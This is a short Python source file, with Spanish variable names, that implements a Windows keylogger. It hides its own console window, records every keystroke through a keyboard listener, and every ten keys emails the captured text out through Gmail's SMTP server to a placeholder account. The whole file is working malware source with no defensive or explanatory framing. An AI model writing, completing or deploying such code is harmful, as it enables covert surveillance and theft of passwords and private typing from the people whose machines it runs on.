import pynput.keyboard
import smtplib
import win32console
import win32gui


usuarioMail = "<Correo Electronico>"
password = "<Contraseña>"

def presiona(key):
	global globalCount
	globalCount = globalCount + 1

	global mensajeGlobal
	mensajeGlobal = mensajeGlobal + str(key) + "\n"

	global server
	global usuarioMail
	global password

	tecla = str(key)

	print ("Tecla presionada:",tecla)
	print("Cantidad de teclas ", globalCount)
	#escribirFichero(tecla, globalCount)

	if(globalCount >= CANTIDAD_PARA_MENSAJE):
		server.sendmail(usuarioMail, usuarioMail, mensajeGlobal)
		mensajeGlobal = ""
		globalCount = 0

	if(tecla == 'Key.end'):
		print("Salido")
		server.sendmail(usuarioMail, usuarioMail, "Proceso finalizado")
		print("Cantidada de teclas ", globalCount)
		return False



ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana, 0)


globalCount = 0
mensajeGlobal = ""
CANTIDAD_PARA_MENSAJE = 10


message = "Inicia Proceso KeyLogger"
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(usuarioMail, password)
server.sendmail(usuarioMail, usuarioMail, password)


with pynput.keyboard.Listener(on_press=presiona) as listen:
	listen.join()

server.quit()
